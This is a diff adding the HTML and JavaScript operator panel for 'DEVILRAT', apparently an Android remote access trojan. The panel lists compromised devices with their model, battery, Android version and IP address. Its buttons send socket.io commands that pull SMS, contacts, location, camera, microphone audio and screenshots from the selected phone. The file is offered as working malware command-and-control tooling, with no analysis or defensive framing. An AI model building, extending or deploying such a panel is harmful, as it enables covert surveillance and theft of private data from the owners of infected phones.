@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👹 DEVILRAT PANEL</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            border-bottom: 3px solid #8b0000;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #333;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 2.5em;
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .device-list {
+            margin: 30px 0;
+        }
+        .device-card {
+            background: #111;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border-left: 5px solid #8b0000;
+        }
+        .device-card.online {
+            border-left-color: #00ff00;
+        }
+        .command-panel {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(26,26,26,0.95);
+            padding: 15px;
+            border-top: 2px solid #ff0000;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+        .cmd-btn {
+            background: #8b0000;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+        .cmd-btn:active {
+            background: #ff0000;
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>👹 DEVILRAT V1 - DOCKER</h1>
+        <p>Real-time Device Control Panel</p>
+        <div id="status">🟢 CONNECTED</div>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-card">
+            <div class="stat-value" id="deviceCount">0</div>
+            <div>DEVICES</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="onlineCount">0</div>
+            <div>ONLINE</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="commandCount">0</div>
+            <div>COMMANDS</div>
+        </div>
+    </div>
+    
+    <div class="device-list" id="deviceList">
+        <!-- Devices will appear here -->
+    </div>
+    
+    <div class="command-panel">
+        <button class="cmd-btn" onclick="sendCommand('sms')">📱 SMS</button>
+        <button class="cmd-btn" onclick="sendCommand('location')">📍 LOC</button>
+        <button class="cmd-btn" onclick="sendCommand('camera')">📸 CAM</button>
+        <button class="cmd-btn" onclick="sendCommand('mic')">🎤 MIC</button>
+        <button class="cmd-btn" onclick="sendCommand('contacts')">📒 CONTACTS</button>
+        <button class="cmd-btn" onclick="sendCommand('messages')">💬 SMS</button>
+        <button class="cmd-btn" onclick="sendCommand('vibrate')">📳 VIBRATE</button>
+        <button class="cmd-btn" onclick="sendCommand('toast')">💬 TOAST</button>
+        <button class="cmd-btn" onclick="sendCommand('screenshot')">🖼️ SCREEN</button>
+    </div>
+
+    <script>
+        const socket = io();
+        let devices = [];
+        let selectedDevice = null;
+        
+        socket.on('connect', () => {
+            document.getElementById('status').textContent = '🟢 CONNECTED';
+        });
+        
+        socket.on('device_update', (device) => {
+            updateDeviceList(device);
+        });
+        
+        function updateDeviceList(device) {
+            const index = devices.findIndex(d => d.id === device.id);
+            if (index >= 0) {
+                devices[index] = device;
+            } else {
+                devices.push(device);
+            }
+            
+            renderDevices();
+            updateStats();
+        }
+        
+        function renderDevices() {
+            const container = document.getElementById('deviceList');
+            container.innerHTML = '';
+            
+            devices.forEach(device => {
+                const card = document.createElement('div');
+                card.className = `device-card ${device.status}`;
+                card.innerHTML = `
+                    <div style="display:flex;justify-content:space-between;">
+                        <div style="font-weight:bold;">${device.model}</div>
+                        <div style="color:${device.status === 'online' ? '#00ff00' : '#ff0000'}">
+                            ${device.status.toUpperCase()}
+                        </div>
+                    </div>
+                    <div style="color:#888;margin-top:10px;">
+                        🔋 ${device.battery} | 📱 ${device.android} | 🌐 ${device.ip}
+                    </div>
+                    <button onclick="selectDevice('${device.id}')" 
+                            style="background:#333;color:white;border:none;padding:8px;margin-top:10px;border-radius:5px;">
+                        SELECT
+                    </button>
+                `;
+                container.appendChild(card);
+            });
+        }
+        
+        function selectDevice(deviceId) {
+            selectedDevice = deviceId;
+            alert(`Selected device: ${deviceId}`);
+        }
+        
+        function sendCommand(command) {
+            if (!selectedDevice) {
+                alert('Select a device first!');
+                return;
+            }
+            
+            socket.emit('command', {
+                deviceId: selectedDevice,
+                command: command
+            });
+            
+            alert(`Command sent: ${command}`);
+        }
+        
+        function updateStats() {
+            const online = devices.filter(d => d.status === 'online').length;
+            document.getElementById('deviceCount').textContent = devices.length;
+            document.getElementById('onlineCount').textContent = online;
+        }
+    </script>
+</body>
+      </html>
